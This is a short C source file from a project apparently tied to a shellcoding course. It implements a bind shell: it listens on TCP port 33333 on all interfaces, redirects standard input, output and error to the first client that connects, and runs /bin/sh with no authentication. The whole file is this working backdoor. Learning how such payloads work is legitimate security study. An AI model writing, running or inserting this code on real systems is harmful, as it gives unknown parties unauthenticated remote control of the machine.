/* -*- Mode: C; indent-tabs-mode: t; c-basic-offset: 4; tab-width: 4 -*-  */
/*
 * main.c
 * Copyright (C) 2015 ady <ady@ady-mini>
 * 
 * slae1 is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * slae1 is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License along
 * with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) 
{
    int sockfd, connfd;
    struct sockaddr_in serv_addr, cli_addr;
    socklen_t sin_size;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    bzero(&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(33333);

    bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    listen(sockfd, 1);

    sin_size = sizeof(cli_addr);
    connfd = accept(sockfd, (struct sockaddr *)&cli_addr, &sin_size);

    dup2(connfd, 0);
    dup2(connfd, 1);
    dup2(connfd, 2);
   
    execve("/bin/sh", NULL, NULL);

}

